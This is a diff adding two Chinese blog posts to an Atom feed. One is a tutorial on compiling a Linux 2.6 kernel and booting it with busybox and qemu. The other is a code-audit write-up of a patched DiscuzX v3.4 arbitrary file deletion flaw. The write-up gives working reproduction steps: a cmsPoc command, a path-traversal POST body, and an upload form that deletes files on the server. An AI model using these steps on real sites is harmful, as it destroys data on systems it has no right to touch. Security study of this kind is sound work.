@@ -199,6 +199,165 @@
   </entry>
   
   <entry>
+    <title>Linux kernel development (1): 环境准备</title>
+    <link href="http://chybeta.github.io/2017/10/19/Linux-kernel-development-1-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"/>
+    <id>http://chybeta.github.io/2017/10/19/Linux-kernel-development-1-环境准备/</id>
+    <published>2017-10-19T15:28:00.000Z</published>
+    <updated>2017-10-21T00:57:38.353Z</updated>
+    
+    <content type="html"><![CDATA[<p>linux kernel + busybox + qemu<br>Linux kernel development (1): 环境准备<br><a id="more"></a></p>
+<h1 id="寻坑之旅"><a href="#寻坑之旅" class="headerlink" title="寻坑之旅"></a>寻坑之旅</h1><h2 id="linux-kernel"><a href="#linux-kernel" class="headerlink" title="linux kernel"></a>linux kernel</h2><h3 id="打包上路"><a href="#打包上路" class="headerlink" title="打包上路"></a>打包上路</h3><p>获取linux kernel源代码。因为书中根据的源代码是2.6，所以就只选择了这个版本。<br>可以从 这里获取 <a href="https://www.kernel.org/pub/linux/kernel/v2.6/" target="_blank" rel="external">https://www.kernel.org/pub/linux/kernel/v2.6/</a>  比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~$ wget https://www.kernel.org/pub/linux/kernel/v2.6/linux-2.6.39.tar.bz2</div></pre></td></tr></table></figure></p>
+<p>解压，会详细的列出解压的文件，解压后的文件会保存在linux-2.6.39文件夹中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~$ tar xvjf linux-2.6.32.tar.bz2</div></pre></td></tr></table></figure></p>
+<p>或者使用git，（这个会下载很大的文件）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~$ git clone https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux-2.6.git</div></pre></td></tr></table></figure></p>
+<p>然后根据需要的版本checkout出来。</p>
+<p>进入解压出来的文件夹。接下去配置（config）内核。根据网上的方法，对于ubuntu系统，可以直接把/boot/ 里的<code>.config</code>文件拷贝到linux-2.6.32中。这里用用make menuconfig 来进行图形化配置内核并生成 .confgi文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/linux-2.6.39$ make menuconfig</div></pre></td></tr></table></figure></p>
+<p>不想进行个性化配置的话，可以使用默认生成的.config，我这里直接使用默认配置了:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/linux-2.6.39$ make defconfig</div></pre></td></tr></table></figure></p>
+<p>其他一些类似命令，这里仅列出：</p>
+<ol>
+<li>make oldconfig 使用已经存在的 ./.config的内容，将里面的原本值作为新config的设定值。新config中涉及的新特性则列出来让用户选择。</li>
+<li>make gconfig 用Gtx图形界面来配置。需要X window支持。</li>
+<li>make xconfig 用Qt图形界面来配置。需要X window支持。</li>
+<li>make config</li>
+</ol>
+<p>配置完（我直接保持默认配置没进行改动）后，选择 <code>Save an Alternate Configuration File</code>，将配置保存到 .config 文件中。</p>
+<p>接下里开始make<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/linux-2.6.39$ make all</div><div class="line">chybeta@ubuntu:~/linux-2.6.39$ make module</div></pre></td></tr></table></figure></p>
+<p>在make all中可能会遇到各种坑，遇到的话看这把。ps，好像make module可以不用。</p>
+<p>最后编译完成：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171020/5.png?raw=true" alt=""></p>
+<p>生成的镜像存放在 arch/x86/boot/bzImage。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/linux-2.6.39$ file arch/x86/boot/bzImage</div><div class="line">arch/x86/boot/bzImage: Linux kernel x86 boot executable bzImage, version 2.6.39 (chybeta@ubuntu) #1 SMP Sat Oct 21 00:50:51 CST 2017, RO-rootFS, root_dev 0x801, swap_dev 0x3, Normal VGA</div></pre></td></tr></table></figure></p>
+<h3 id="正式填坑"><a href="#正式填坑" class="headerlink" title="正式填坑"></a>正式填坑</h3><p>这次是第一次，但绝不会是最后一次编译内核。所以这部份会长期保持更新。希望对各位有用。</p>
+<p>有可能在make all的时候出现下面这些错误：</p>
+<h4 id="坑一"><a href="#坑一" class="headerlink" title="坑一"></a>坑一</h4><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171020/2.png?raw=true" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fatal error: linux/compiler-gcc5.h: No such file or directory</div></pre></td></tr></table></figure></p>
+<p>原因是 不支持gcc-5编译。可以到<a href="https://github.com/torvalds/linux/blob/v4.0/include/linux/compiler-gcc5.h" target="_blank" rel="external">这里</a>去下一份对应的compiler-gcc5.h。放到 include/linux/compiler-gcc5.h</p>
+<h4 id="坑二"><a href="#坑二" class="headerlink" title="坑二"></a>坑二</h4><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171020/3.png?raw=true" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Can&apos;t use &apos;defined(@array)&apos; (Maybe you should just omit the defined()?) at kernel/timeconst.pl line 373.</div><div class="line">/home/chybeta/linux-2.6.39/kernel/Makefile:141: recipe for target &apos;kernel/timeconst.h&apos; failed</div></pre></td></tr></table></figure></p>
+<p>编辑 kernel/timeconst.pl ，第372行左右：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">@val = @&#123;$canned_values&#123;$hz&#125;&#125;;</div><div class="line">if (!defined(@val)) &#123;</div><div class="line">	@val = compute_values($hz);</div><div class="line">&#125;</div><div class="line">output($hz, @val);</div></pre></td></tr></table></figure></p>
+<p>修改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">@val = @&#123;$canned_values&#123;$hz&#125;&#125;;</div><div class="line">if (!@val) &#123;</div><div class="line">	@val = compute_values($hz);</div><div class="line">&#125;</div><div class="line">output($hz, @val);</div></pre></td></tr></table></figure></p>
+<h4 id="坑三"><a href="#坑三" class="headerlink" title="坑三"></a>坑三</h4><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171020/4.png?raw=true" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">drivers/gpu/drm/i915/i915_drv.o:i915_drv.c:(.text+0x406): first defined here</div><div class="line">scripts/Makefile.build:405: recipe for target &apos;drivers/gpu/drm/i915/i915.o&apos; failed</div><div class="line">make[4]: *** [drivers/gpu/drm/i915/i915.o] Error 1</div><div class="line">scripts/Makefile.build:419: recipe for target &apos;drivers/gpu/drm/i915&apos; failed</div><div class="line">make[3]: *** [drivers/gpu/drm/i915] Error 2</div><div class="line">scripts/Makefile.build:419: recipe for target &apos;drivers/gpu/drm&apos; failed</div><div class="line">make[2]: *** [drivers/gpu/drm] Error 2</div><div class="line">scripts/Makefile.build:419: recipe for target &apos;drivers/gpu&apos; failed</div><div class="line">make[1]: *** [drivers/gpu] Error 2</div><div class="line">Makefile:919: recipe for target &apos;drivers&apos; failed</div></pre></td></tr></table></figure>
+<p>google/stackoverflow上没找到解决方案。</p>
+<p>我直接修改了由<code>make defconfig</code>生成的<code>.config</code>文件，其中第1781左右，是关于图形化（Graphics support）的部分，修改参数为如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#</div><div class="line"># Graphics support</div><div class="line">#</div><div class="line"># CONFIG_AGP is not set</div><div class="line">CONFIG_VGA_ARB=y</div><div class="line">CONFIG_VGA_ARB_MAX_GPUS=1</div><div class="line"># CONFIG_VGA_SWITCHEROO is not set</div><div class="line"># CONFIG_DRM is not set</div><div class="line"># CONFIG_STUB_POULSBO is not set</div><div class="line"># CONFIG_VGASTATE is not set</div><div class="line"># CONFIG_VIDEO_OUTPUT_CONTROL is not set</div><div class="line"># CONFIG_FB is not set</div><div class="line">CONFIG_BACKLIGHT_LCD_SUPPORT=y</div><div class="line"># CONFIG_LCD_CLASS_DEVICE is not set</div><div class="line">CONFIG_BACKLIGHT_CLASS_DEVICE=y</div><div class="line">CONFIG_BACKLIGHT_GENERIC=y</div><div class="line"># CONFIG_BACKLIGHT_PROGEAR is not set</div><div class="line"># CONFIG_BACKLIGHT_APPLE is not set</div><div class="line"># CONFIG_BACKLIGHT_SAHARA is not set</div><div class="line"># CONFIG_BACKLIGHT_ADP8860 is not set</div></pre></td></tr></table></figure></p>
+<h2 id="busybox"><a href="#busybox" class="headerlink" title="busybox"></a>busybox</h2><p>busybox里面集成了多种常用linux命令。接下去需要用busybox来生成linux的根文件系统。</p>
+<p>在 <a href="https://busybox.net/" target="_blank" rel="external">https://busybox.net/</a> 处下载源码，我下的版本是 BusyBox 1.27.2。</p>
+<p>解压缩：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~$ tar -xvjf busybox-1.27.2.tar.bz2</div></pre></td></tr></table></figure></p>
+<p>进入busybox文件夹，需要使用静态链接的方式来编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/busybox-1.27.2$ make menuconfig</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171020/7.png?raw=true" alt=""><br>先进入 Busybox Setting，之后选择Build Options中的 Build Busybox as a static library。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/busybox-1.27.2$ make install</div></pre></td></tr></table></figure>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171020/6.png?raw=true" alt=""></p>
+<p>安装成功。</p>
+<p>install后，默认会在busybox的目录下生成一个 <code>_install</code>目录。接下来用这个目录来生成虚拟机挂载时需要的根文件目录。</p>
+<p>这一步，创建一个目录用于保存rootfs.img<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/busybox-1.27.2$ mkdir ../kernelrootfs</div></pre></td></tr></table></figure></p>
+<p>生成:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/busybox-1.27.2$ cd _install/</div><div class="line">chybeta@ubuntu:~/busybox-1.27.2/_install$ find . | cpio -o --format=newc &gt; ../../kernelrootfs/rootfs.img</div><div class="line">5213 blocks</div></pre></td></tr></table></figure></p>
+<p>结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/kernelrootfs$ file rootfs.img</div><div class="line">rootfs.img: ASCII cpio archive (SVR4 with no CRC)</div></pre></td></tr></table></figure></p>
+<h2 id="Qemu"><a href="#Qemu" class="headerlink" title="Qemu"></a>Qemu</h2><p>qemu是一个开源的虚拟机，它内部实现了一个gdb server，能方便和gdb对内核进行联合调试。安装qemu虚拟机：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~$ sudo apt-get install qemu qemu-system</div></pre></td></tr></table></figure></p>
+<p>用qemu开启虚拟机：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~$ qemu-system-x86_64 -kernel linux-2.6.39/arch/x86/boot/bzImage -initrd kernelrootfs/rootfs.img -append &quot;root=/dev/ram rdinit=/bin/sh&quot;</div></pre></td></tr></table></figure></p>
+<p>参数<code>-kernel</code>，用于指定内核的所在地，在前面部分已经保存在为 linux-2.6.39/arch/x86/boot/bzImage 。参数<code>-initrd</code>用于指定linux系统挂载用的根文件目录，由前面章节，已经保存在为 kernelrootfs/rootfs.img 。这两个参数，根据你前面的配置而定。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171020/8.png?raw=true" alt=""></p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>还有一些其他的操作还没写出来，比如添加系统调用（syscall）之类的。以后用到再慢慢补充吧。</p>
+<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
+<li><a href="https://nostillsearching.wordpress.com/2012/09/22/compiling-linux-kernel-and-running-it-using-qemu/" target="_blank" rel="external">Compiling Linux kernel and running it using QEMU</a></li>
+<li><a href="http://bobao.360.cn/learning/detail/3700.html" target="_blank" rel="external">Linux 内核漏洞利用教程（一）：环境配置</a></li>
+<li><a href="https://stackoverflow.com/questions/17242403/linux-running-self-compiled-kernel-in-qemu-vfs-unable-to-mount-root-fs-on-unk" target="_blank" rel="external">linux: running self compiled kernel in qemu: VFS: Unable to mount root fs on unknown wn-block(0,0)</a></li>
+<li><a href="http://blog.csdn.net/LEON1741/article/details/54848842" target="_blank" rel="external">如何使用busybox编译和生成最简linux根文件系统（rootfs） </a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;linux kernel + busybox + qemu&lt;br&gt;Linux kernel development (1): 环境准备&lt;br&gt;
+    
+    </summary>
+    
+      <category term="技术杂谈" scheme="http://chybeta.github.io/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/"/>
+    
+    
+      <category term="linux" scheme="http://chybeta.github.io/tags/linux/"/>
+    
+      <category term="kernel" scheme="http://chybeta.github.io/tags/kernel/"/>
+    
+      <category term="lkd" scheme="http://chybeta.github.io/tags/lkd/"/>
+    
+      <category term="qemu" scheme="http://chybeta.github.io/tags/qemu/"/>
+    
+      <category term="busybox" scheme="http://chybeta.github.io/tags/busybox/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>DiscuzX v3.4 任意文件删除漏洞</title>
+    <link href="http://chybeta.github.io/2017/10/15/DiscuzX-v3-4-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://chybeta.github.io/2017/10/15/DiscuzX-v3-4-任意文件删除漏洞/</id>
+    <published>2017-10-15T10:06:18.000Z</published>
+    <updated>2017-10-21T00:49:17.875Z</updated>
+    
+    <content type="html"><![CDATA[<p>代码审计学习。<br>玩一玩老洞应该没关系吧。。<br><a id="more"></a></p>
+<h1 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h1><p>DiscuzX版本 ≤ v3.4</p>
+<p>官方于9月29日修复该漏洞： <a href="https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574" target="_blank" rel="external">https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574</a></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>Dz下载地址： <a href="https://gitee.com/ComsenzDiscuz/DiscuzX.git" target="_blank" rel="external">https://gitee.com/ComsenzDiscuz/DiscuzX.git</a> 选择一个时间线在9月29日前的进行git checkout即可。比如 <code>git checkout 1a912ddb4a62364d1736fa4578b42ecc62c5d0be</code>。安装完成后，在当前目录下准备一个待删除的文件，比如theTestFile.txt<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171016/4.png?raw=true" alt=""></p>
+<p>随便注册一个号，进入个人设置中心，即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://10.10.10.1:2500/DiscuzX/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base</div></pre></td></tr></table></figure></p>
+<h2 id="cmsPoc"><a href="#cmsPoc" class="headerlink" title="cmsPoc"></a><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmsPoc</a></h2><p>登陆后获取cookie后，命令行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python cmspoc.py -u http://10.10.10.1:2500/DiscuzX/upload/home.php -t discuzx -s v34_delete_arbitrary_files</div></pre></td></tr></table></figure></p>
+<p>粘贴cookie，后输入需要删除的文件。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171016/tty.gif?raw=true" alt=""></p>
+<h2 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h2><p>修改出生地址为要删除的文件地址，这里比如 ../../theTestFile.txt</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171016/1.png?raw=true" alt=""></p>
+<p>可以用burp截包修改<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171016/2.png?raw=true" alt=""></p>
+<p>也可以先查看源代码（ctrl+U）后找到formhash值，这里测试环境中为2c7400c6<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171016/7.png?raw=true" alt=""></p>
+<p>然后直接进行POST:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:2500/DiscuzX/upload/home.php?mod=spacecp&amp;ac=profile</div><div class="line"></div><div class="line">POST:</div><div class="line">birthprovince=../../../theTestFile.txt&amp;profilesubmit=1&amp;formhash=2c7400c6</div></pre></td></tr></table></figure></p>
+<p>回到个人资料处，可以发现出生地已经改变。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171016/8.png?raw=true" alt=""></p>
+<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>接下去是进行正式的任意文件删除。可以自己构造一个表单，如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1:2500/DiscuzX/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"birthprovince"</span> <span class="attr">value</span>=<span class="string">"../../../theTestFile.txt"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"formhash"</span> <span class="attr">value</span>=<span class="string">"2c7400c6"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"profilesubmit"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">from</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>这里要注意两个点：</p>
+<ol>
+<li>需要post一个birthprovince参数，其值为要删除的文件，即../../../theTestFile.txt</li>
+<li>需要指定formhash参数，这里的值为2c7400c6</li>
+</ol>
+<p>选择随便一张图片上传，点击submit，可以发现原本的theTestFile.txt已经被删除。</p>
+<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>另一种删除方法，直接在个人资料页面修改html代码。比如修改真实姓名处<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171016/10.png?raw=true" alt=""></p>
+<p>修改name，value，type分别为birthprovince，要删除的文件路径，file。</p>
+<p>之后选择随便一张图片上传，点击下方的保存，同样theTestFile也被删除。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在source/include/spacecp/spacecp_profile.php中，第69行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(submitcheck(<span class="string">'profilesubmit'</span>)) &#123;</div></pre></td></tr></table></figure></p>
+<p>先对profilesubmit进行了一次检查。</p>
+<p>之后第188行，有一段处理上传文件的代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($_FILES) &#123;</div><div class="line">	$upload = <span class="keyword">new</span> discuz_upload();</div><div class="line">	<span class="keyword">foreach</span>($_FILES <span class="keyword">as</span> $key =&gt; $file)</div></pre></td></tr></table></figure></p>
+<p>往下看，约莫第208行左右，有下述代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(!$upload-&gt;error()) &#123;</div><div class="line">	$upload-&gt;save();</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(!$upload-&gt;get_image_info($attach[<span class="string">'target'</span>])) &#123;</div><div class="line">		@unlink($attach[<span class="string">'target'</span>]);</div><div class="line">		<span class="keyword">continue</span>;</div><div class="line">	&#125;</div><div class="line">	$setarr[$key] = <span class="string">''</span>;</div><div class="line">	$attach[<span class="string">'attachment'</span>] = dhtmlspecialchars(trim($attach[<span class="string">'attachment'</span>]));</div><div class="line">	<span class="keyword">if</span>($vid &amp;&amp; $verifyconfig[<span class="string">'available'</span>] &amp;&amp; <span class="keyword">isset</span>($verifyconfig[<span class="string">'field'</span>][$key])) &#123;</div><div class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($verifyinfo[<span class="string">'field'</span>][$key])) &#123;</div><div class="line">			@unlink(getglobal(<span class="string">'setting/attachdir'</span>).<span class="string">'./profile/'</span>.$verifyinfo[<span class="string">'field'</span>][$key]);</div><div class="line">			$verifyarr[$key] = $attach[<span class="string">'attachment'</span>];</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">continue</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($setarr[$key]) &amp;&amp; $_G[<span class="string">'cache'</span>][<span class="string">'profilesetting'</span>][$key][<span class="string">'needverify'</span>]) &#123;</div><div class="line">		@unlink(getglobal(<span class="string">'setting/attachdir'</span>).<span class="string">'./profile/'</span>.$verifyinfo[<span class="string">'field'</span>][$key]);</div><div class="line">		$verifyarr[$key] = $attach[<span class="string">'attachment'</span>];</div><div class="line">		<span class="keyword">continue</span>;</div><div class="line">	&#125;</div><div class="line">	@unlink(getglobal(<span class="string">'setting/attachdir'</span>).<span class="string">'./profile/'</span>.$space[$key]);</div><div class="line">	$setarr[$key] = $attach[<span class="string">'attachment'</span>];</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>当文件上传成功，也就是<code>!$upload-&gt;error()</code>，会执行到unlink语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">@unlink(getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$space[$key]);</div></pre></td></tr></table></figure></p>
+<p>这里的<code>$key</code>，在前面<code>foreach($_FILES as $key =&gt; $file)</code>中定义。</p>
+<p>而<code>$space</code>，为用户个人资料，在source/include/spacecp/spacecp_profile.php的第23行左右：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$space = getuserbyuid($_G[<span class="string">'uid'</span>]);</div><div class="line">space_merge($space, <span class="string">'field_home'</span>);</div><div class="line">space_merge($space, <span class="string">'profile'</span>);</div></pre></td></tr></table></figure></p>
+<p>这些操作会将用户相关的信息通过数据库提取出来保存到变量$space中。你可以在上面三句代码后面加上一句<code>var_dump($space);</code>，然后访问 <a href="http://127.0.0.1:2500/DiscuzX/upload/home.php?mod=spacecp&amp;ac=profile" target="_blank" rel="external">http://127.0.0.1:2500/DiscuzX/upload/home.php?mod=spacecp&amp;ac=profile</a> 。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171016/11.png?raw=true" alt=""></p>
+<p>即可看到一堆的变量，比如说birthprovince。</p>
+<p>所以思考一下这个过程：</p>
+<ol>
+<li>设置birthprovince为要删除的文件，比如../../theTestFile.txt</li>
+<li>上传文件，构造$key 为 birthprovince。</li>
+<li>$space[$key] = $space[birthprovince] =</li>
+<li>拼接后 unlink(getglobal(XXX/profile/../../theTestFile.txt)  达到任意文件删除。</li>
+</ol>
+<p>上面的这个思路，即对应着前面漏洞复现中的法一和法二。</p>
+<h1 id="相关老洞"><a href="#相关老洞" class="headerlink" title="相关老洞"></a>相关老洞</h1><p>乌云编号： wooyun-2014-065513</p>
+<p>当时的漏洞代码出在source/include/spacecp/spacecp_profile.php中，第69行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 这是当时的漏洞代码</span></div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'deletefile'</span>] &amp;&amp; is_array($_GET[<span class="string">'deletefile'</span>])) &#123;</div><div class="line">	<span class="keyword">foreach</span>($_GET[<span class="string">'deletefile'</span>] <span class="keyword">as</span> $key =&gt; $value) &#123;</div><div class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_G[<span class="string">'cache'</span>][<span class="string">'profilesetting'</span>][$key])) &#123;</div><div class="line">			<span class="keyword">echo</span> (getglobal(<span class="string">'setting/attachdir'</span>).<span class="string">'./profile/'</span>.$space[$key]);</div><div class="line">			@unlink(getglobal(<span class="string">'setting/attachdir'</span>).<span class="string">'./profile/'</span>.$space[$key]);</div><div class="line">			@unlink(getglobal(<span class="string">'setting/attachdir'</span>).<span class="string">'./profile/'</span>.$verifyinfo[<span class="string">'field'</span>][$key]);</div><div class="line">			$verifyarr[$key] = $setarr[$key] = <span class="string">''</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>官方当时的补丁做法是：增加了一次判断<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'deletefile'</span>] &amp;&amp; is_array($_GET[<span class="string">'deletefile'</span>])) &#123;</div><div class="line">	<span class="keyword">foreach</span>($_GET[<span class="string">'deletefile'</span>] <span class="keyword">as</span> $key =&gt; $value) &#123;</div><div class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_G[<span class="string">'cache'</span>][<span class="string">'profilesetting'</span>][$key]) &amp;&amp; $_G[<span class="string">'cache'</span>][<span class="string">'profilesetting'</span>][$key][<span class="string">'formtype'</span>] == <span class="string">'file'</span>) &#123;</div><div class="line">			<span class="keyword">echo</span> <span class="string">"0"</span>;</div><div class="line">			@unlink(getglobal(<span class="string">'setting/attachdir'</span>).<span class="string">'./profile/'</span>.$space[$key]);</div><div class="line">			@unlink(getglobal(<span class="string">'settin</span></div><div class="line">				g/attachdir').<span class="string">'./profile/'</span>.$verifyinfo[<span class="string">'field'</span>][$key]);</div><div class="line">			$verifyarr[$key] = $setarr[$key] = <span class="string">''</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
